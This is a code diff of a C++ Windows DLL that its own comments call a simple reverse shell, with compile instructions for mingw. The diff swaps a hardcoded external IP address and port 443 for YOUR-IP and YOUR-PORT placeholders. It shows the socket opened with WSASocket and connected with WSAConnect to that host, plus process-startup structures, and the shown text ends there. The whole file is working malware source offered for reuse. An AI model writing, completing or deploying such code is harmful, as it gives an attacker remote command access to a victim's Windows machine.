@@ -1,13 +1,12 @@
+// This reverse shell is very simple, no agents header nor encryption
+// Compile: mingw32-c++.exe DateFunc.cpp -shared -o DateFunc.dll -static DateFunc.def
+// change YOUR-PORT and YOUR-IP
+ 
+
 #include <Windows.h>
 
-extern "C" __declspec(dllexport) LONG Main(
-	HWND hwndCpl,
-	UINT msg,
-	LPARAM lParam1,
-	LPARAM lParam2
-)
+extern "C" __declspec(dllexport) LONG Main(HWND hwndCpl, UINT msg, LPARAM lParam1, LPARAM lParam2)
 {
-
       WSADATA wsaData;
       SOCKET s1;
       struct sockaddr_in hax;
@@ -15,8 +14,8 @@ extern "C" __declspec(dllexport) LONG Main(
       STARTUPINFO sui;
       PROCESS_INFORMATION pi;
       hax.sin_family = AF_INET;
-      hax.sin_port = htons(443);
-      hax.sin_addr.s_addr = inet_addr("87.57.141.215");
+      hax.sin_port = htons(YOUR-PORT);
+      hax.sin_addr.s_addr = inet_addr("YOUR-IP");
       WSAStartup(MAKEWORD(2, 2), &wsaData);
       s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
       WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
